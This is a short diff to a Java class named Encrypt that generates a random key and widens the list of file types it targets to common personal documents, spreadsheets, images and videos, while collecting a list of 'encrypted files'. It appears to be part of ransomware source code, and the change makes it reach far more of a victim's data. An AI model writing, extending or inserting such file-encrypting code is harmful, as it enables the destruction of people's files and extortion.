@@ -13,7 +13,7 @@ import java.util.UUID;
 public class Encrypt {
 
     private static final String KEY = UUID.randomUUID().toString().replaceAll("-", "");
-    private static final String[] EXTENSIONS = new String[]{".exe", ".txt", ".png", ".jpeg"};
+    private static final String[] EXTENSIONS = new String[]{".doc", ".docx", ".pdf", ".txt", ".ppt", ".pptx", ".xls", ".xlsx", ".csv", ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".svg", ".mp4", ".avi", ".mov", ".wmv", ".flv", ".swf", ".mkv"};
 
     public static void runEncryption() throws Exception {
         List<String> encryptedFiles = new ArrayList<>();
